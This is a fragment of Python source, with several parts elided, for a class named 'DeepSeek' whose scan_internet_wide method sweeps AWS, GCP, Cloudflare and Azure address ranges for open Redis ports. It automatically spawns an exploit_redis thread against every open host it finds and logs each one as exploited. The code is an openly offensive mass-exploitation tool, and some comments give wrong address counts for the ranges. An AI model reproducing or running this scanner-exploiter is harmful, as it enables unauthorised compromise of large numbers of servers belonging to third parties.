...
class DeepSeek:
    ...
    def scan_internet_wide(self, port=6379, rate=50000):
        ...
        # GUARANTEE networks (never empty)
        try:
            networks = self.shard_manager.get_assigned_networks()
        except:
            networks = [
                '3.0.0.0/8',      # AWS (16M IPs)
                '35.184.0.0/13',  # GCP (8K IPs)
                '104.16.0.0/12',  # Cloudflare (256K IPs)
                '13.64.0.0/11'    # Azure (32K IPs)
            ]

        logger.info(f"🔍 PRODUCTION SCAN: {len(networks)} networks (33M+ IPs)")
                    ...
                    with open(output_file, 'r') as f:
                        for line in f:
                            if 'open' in line:
                                ...
                                if len(parts) >= 4:
                                    ip = parts[3]
                                    t = threading.Thread(target=self.exploit_redis, args=(ip, port), daemon=True)
                                    t.start()
                                    self.exploited_count += 1
                                    logger.info(f"✅ EXPLOITED {ip}:{port} (#{self.exploited_count})")
